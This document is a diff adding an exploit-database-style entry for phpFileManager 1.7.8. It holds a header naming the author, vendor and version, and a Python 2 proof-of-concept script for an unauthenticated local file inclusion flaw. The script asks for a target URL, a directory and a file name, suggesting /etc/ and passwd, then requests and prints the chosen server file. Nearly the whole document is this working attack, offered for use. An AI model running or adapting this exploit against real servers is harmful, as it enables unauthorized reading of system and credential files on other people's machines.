@@ -1,0 +1,33 @@
+# Exploit Title: phpFileManager 1.7.8 - Local File Inclusion
+# Date: 01.04.2019
+# Exploit Author: Murat Kalafatoglu
+# Vendor Homepage: https://sourceforge.net/projects/phpfm/
+# Software Demo: https://phpfm-demo.000webhostapp.com/
+# Version: v1.7.8
+# Category: Webapps
+# Tested on: XAMPP for Linux
+# Description: Any user can read files from the server
+# without authentication due to an existing LFI in the following path:
+# http://target/index.php?action=3&fm_current_dir=%2Fetc%2F&filename=passwd
+
+# PoC
+
+#!/usr/bin/python
+
+import requests, sys
+
+print "\n[*] phpFileManager 1.7.8 LFI PoC By Murat Kalafatoglu"
+print "[+] usage: python " + __file__ + " http://<target_ip/domain>"
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <target_ip/domain>"
+    exit(0)
+ip_add = sys.argv[1]
+
+dr = raw_input('[+] Directory: aka /etc/\n')
+fd = raw_input('[+] File : aka passwd\n')
+
+print "Exploiting....."
+print '\n'
+
+exp = requests.get(""+ ip_add + "index.php?action=3&fm_current_dir=" + dr + "&filename=" + fd +"")
+print exp.text
